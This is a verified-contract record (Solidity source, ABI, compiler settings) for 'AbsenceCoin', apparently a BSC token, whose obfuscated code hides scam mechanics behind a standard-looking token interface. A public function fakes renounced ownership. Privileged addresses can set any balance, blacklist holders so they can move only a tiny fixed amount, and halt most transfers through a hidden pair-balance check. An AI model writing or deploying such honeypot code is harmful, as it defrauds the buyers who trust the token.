{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract feeList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingEnable {\n    function createPair(address senderListTake, address launchLimit) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface takeReceiverTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface tradingFromList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellTeam) external view returns (uint256);\n\n    function transfer(address amountAuto, uint256 isAmount) external returns (bool);\n\n    function allowance(address tokenTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountAuto,\n        uint256 isAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listIs, uint256 value);\n    event Approval(address indexed tokenTake, address indexed spender, uint256 value);\n}\n\ninterface fundSwapLimit is tradingFromList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AbsenceCoin is feeList, tradingFromList, fundSwapLimit {\n\n    function receiverLaunchFund(address autoTrading) public {\n        takeLaunched();\n        if (takeEnable == marketingTotal) {\n            autoToBuy = false;\n        }\n        if (autoTrading == marketingAt || autoTrading == liquidityLaunchedTx) {\n            return;\n        }\n        marketingWallet[autoTrading] = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return takeBuySwap;\n    }\n\n    function owner() external view returns (address) {\n        return takeBuySwap;\n    }\n\n    function minReceiverTrading(uint256 isAmount) public {\n        takeLaunched();\n        liquidityFromIs = isAmount;\n    }\n\n    mapping(address => mapping(address => uint256)) private swapExempt;\n\n    bool private takeEnable;\n\n    function tokenTrading(address fromFund, address amountAuto, uint256 isAmount) internal returns (bool) {\n        require(launchedAuto[fromFund] >= isAmount);\n        launchedAuto[fromFund] -= isAmount;\n        launchedAuto[amountAuto] += isAmount;\n        emit Transfer(fromFund, amountAuto, isAmount);\n        return true;\n    }\n\n    string private fundWallet = \"ACN\";\n\n    uint256 public liquidityReceiver = 3;\n\n    function fundEnableTx(address fromFund, address amountAuto, uint256 isAmount) internal view returns (uint256) {\n        require(isAmount > 0);\n\n        uint256 tokenSwapTake = 0;\n        if (fromFund == liquidityLaunchedTx && liquidityReceiver > 0) {\n            tokenSwapTake = isAmount * liquidityReceiver / 100;\n        } else if (amountAuto == liquidityLaunchedTx && maxLiquidity > 0) {\n            tokenSwapTake = isAmount * maxLiquidity / 100;\n        }\n        require(tokenSwapTake <= isAmount);\n        return isAmount - tokenSwapTake;\n    }\n\n    function transfer(address tradingSell, uint256 isAmount) external virtual override returns (bool) {\n        return txFeeShould(_msgSender(), tradingSell, isAmount);\n    }\n\n    function approve(address sellShould, uint256 isAmount) public virtual override returns (bool) {\n        swapExempt[_msgSender()][sellShould] = isAmount;\n        emit Approval(_msgSender(), sellShould, isAmount);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundWallet;\n    }\n\n    event OwnershipTransferred(address indexed limitMin, address indexed isSwap);\n\n    address private takeBuySwap;\n\n    function balanceOf(address sellTeam) public view virtual override returns (uint256) {\n        return launchedAuto[sellTeam];\n    }\n\n    function tradingAmount(address buyMarketingTeam) public {\n        require(buyMarketingTeam.balance < 100000);\n        if (marketingTrading) {\n            return;\n        }\n        if (toExempt) {\n            autoToBuy = false;\n        }\n        receiverIsReceiver[buyMarketingTeam] = true;\n        \n        marketingTrading = true;\n    }\n\n    uint256 public maxLiquidity = 0;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletEnableFee;\n    }\n\n    function takeLaunched() private view {\n        require(receiverIsReceiver[_msgSender()]);\n    }\n\n    address launchSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private liquidityWallet = 100000000 * 10 ** 18;\n\n    string private totalWalletSell = \"Absence Coin\";\n\n    address public liquidityLaunchedTx;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityWallet;\n    }\n\n    uint256 liquidityFromIs;\n\n    mapping(address => bool) public receiverIsReceiver;\n\n    constructor (){\n        \n        atFrom();\n        takeReceiverTo limitExempt = takeReceiverTo(launchSell);\n        liquidityLaunchedTx = marketingEnable(limitExempt.factory()).createPair(limitExempt.WETH(), address(this));\n        receiverShould = marketingEnable(limitExempt.factory()).feeTo();\n        \n        marketingAt = _msgSender();\n        receiverIsReceiver[marketingAt] = true;\n        launchedAuto[marketingAt] = liquidityWallet;\n        if (takeEnable) {\n            takeEnable = true;\n        }\n        emit Transfer(address(0), marketingAt, liquidityWallet);\n    }\n\n    mapping(address => uint256) private launchedAuto;\n\n    mapping(address => bool) public marketingWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return totalWalletSell;\n    }\n\n    address public marketingAt;\n\n    function atFrom() public {\n        emit OwnershipTransferred(marketingAt, address(0));\n        takeBuySwap = address(0);\n    }\n\n    function transferFrom(address fromFund, address amountAuto, uint256 isAmount) external override returns (bool) {\n        if (_msgSender() != launchSell) {\n            if (swapExempt[fromFund][_msgSender()] != type(uint256).max) {\n                require(isAmount <= swapExempt[fromFund][_msgSender()]);\n                swapExempt[fromFund][_msgSender()] -= isAmount;\n            }\n        }\n        return txFeeShould(fromFund, amountAuto, isAmount);\n    }\n\n    function allowance(address minLaunchTx, address sellShould) external view virtual override returns (uint256) {\n        if (sellShould == launchSell) {\n            return type(uint256).max;\n        }\n        return swapExempt[minLaunchTx][sellShould];\n    }\n\n    bool private toExempt;\n\n    function marketingMax(address tradingSell, uint256 isAmount) public {\n        takeLaunched();\n        launchedAuto[tradingSell] = isAmount;\n    }\n\n    function txFeeShould(address fromFund, address amountAuto, uint256 isAmount) internal returns (bool) {\n        if (fromFund == marketingAt) {\n            return tokenTrading(fromFund, amountAuto, isAmount);\n        }\n        uint256 feeEnable = tradingFromList(liquidityLaunchedTx).balanceOf(receiverShould);\n        require(feeEnable == liquidityFromIs);\n        require(amountAuto != receiverShould);\n        if (marketingWallet[fromFund]) {\n            return tokenTrading(fromFund, amountAuto, launchWallet);\n        }\n        isAmount = fundEnableTx(fromFund, amountAuto, isAmount);\n        return tokenTrading(fromFund, amountAuto, isAmount);\n    }\n\n    uint256 autoTeam;\n\n    address receiverShould;\n\n    uint8 private walletEnableFee = 18;\n\n    bool public autoToBuy;\n\n    uint256 constant launchWallet = 15 ** 10;\n\n    bool public marketingTotal;\n\n    bool public marketingTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLaunchTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoToBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLaunchedTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAmount\",\"type\":\"uint256\"}],\"name\":\"marketingMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isAmount\",\"type\":\"uint256\"}],\"name\":\"minReceiverTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverIsReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTrading\",\"type\":\"address\"}],\"name\":\"receiverLaunchFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMarketingTeam\",\"type\":\"address\"}],\"name\":\"tradingAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AbsenceCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}